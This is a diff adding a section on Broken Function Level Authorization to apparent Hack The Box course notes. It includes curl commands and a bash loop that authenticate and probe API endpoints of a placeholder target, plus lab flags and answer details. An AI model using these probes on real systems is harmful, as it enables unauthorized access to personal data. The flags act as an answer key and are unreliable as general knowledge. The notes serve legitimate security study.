@@ -59,6 +59,82 @@ Don't add complexity. The section tells you exactly what to test. Do that one th
 | 5 — Excessive Data Exposure | Customer reads `email` from `/api/v1/supplier-companies` | `HTB{d759c70b5a9f6a392af78cc1eca9cdf0}` |
 | 5 — Mass Assignment | Set `NetSum: 0` on POST `/api/v1/customers/orders/items` | `HTB{4d86794f82046e465ca29d91bdbe5bca}` |
 | 6 — Unrestricted Resource Consumption | Spam SMS OTP endpoint with no rate limiting | `HTB{01de742d8cd942ad682aeea9ce3c5428}` |
+| 7 — BFLA | GET `/api/v1/customers/billing-addresses` with no roles | `HTB{1e2095c564baf0d2d316080217040dae}` |
+
+---
+
+## Section 7: Broken Function Level Authorization (API5:2023)
+
+### What It Is
+
+BFLA occurs when an API allows unauthorized or unprivileged users to invoke privileged endpoints. Distinct from BOLA: in BOLA the user is authorized to use the endpoint but accesses the wrong object; in BFLA the user has no authorization to use the endpoint at all — the role check simply isn't implemented.
+
+- **CWE:** CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor
+- **OWASP:** API5:2023
+
+### Attack Pattern
+
+1. Authenticate → get JWT
+2. Check roles (`/api/v1/roles/current-user`) — confirm you have no roles or limited roles
+3. Enumerate all endpoints from swagger.json
+4. Try every parameterless GET endpoint with your JWT — BFLA endpoints return real data instead of an authorization error
+5. Read full responses of endpoints that return data — flag or sensitive info will be embedded
+
+### Commands
+
+#### Probe all parameterless GET endpoints for BFLA
+```bash
+JWT=$(curl -s -X POST 'http://<TARGET>/api/v1/authentication/customers/sign-in' -H 'Content-Type: application/json' -d '{"Email": "<EMAIL>", "Password": "<PASS>"}' | jq -r '.jwt')
+```
+
+Write a loop to `/tmp/bfla.sh`:
+```bash
+ENDPOINTS=(
+  "/api/v1/supplier-companies"
+  "/api/v1/supplier-companies/yearly-reports"
+  "/api/v1/suppliers"
+  "/api/v1/suppliers/quarterly-reports"
+  "/api/v1/products"
+  "/api/v1/products/discounts"
+  "/api/v1/customers"
+  "/api/v1/customers/payment-options"
+  "/api/v1/customers/orders"
+  "/api/v1/customers/billing-addresses"
+)
+
+for ep in "${ENDPOINTS[@]}"; do
+  echo "=== $ep ==="
+  curl -s -X GET "http://<TARGET>${ep}" -H "Authorization: Bearer $JWT" | jq -c '.' | head -c 300
+  echo
+done
+```
+
+#### Get full response from a BFLA-vulnerable endpoint
+```bash
+curl -s -X GET 'http://<TARGET>/api/v1/customers/billing-addresses' -H "Authorization: Bearer $JWT" | jq
+```
+
+### What Works
+
+- Script-based enumeration — try all collection GET endpoints; BFLA ones return data, secured ones return an auth error
+- Flag is embedded in a data field — pipe through `| jq | grep "HTB"` to find it quickly
+- JWT set inside a script subshell does NOT persist to the current shell — always re-authenticate in the current shell before running individual commands
+
+### What Doesn't Work
+
+- Using `$JWT` in the current shell after running it inside a bash script — variable is lost when subshell exits; re-authenticate first
+
+### Exercise Result
+
+- **User:** `htbpentester9@hackthebox.com` — no roles assigned
+- **BFLA endpoint (shown in section):** `GET /api/v1/products/discounts` (requires `ProductDiscounts_GetAll`)
+- **BFLA endpoint (exercise):** `GET /api/v1/customers/billing-addresses` — returned full customer PII with no role check
+- **Flag location:** `street` field of one of the billing address entries
+- **Flag:** `HTB{1e2095c564baf0d2d316080217040dae}`
+
+### Prevention
+
+Enforce role-based access control at the source-code level on every endpoint — verify the caller's roles before processing the request, regardless of whether the endpoint is a GET or POST.
 
 ---
 
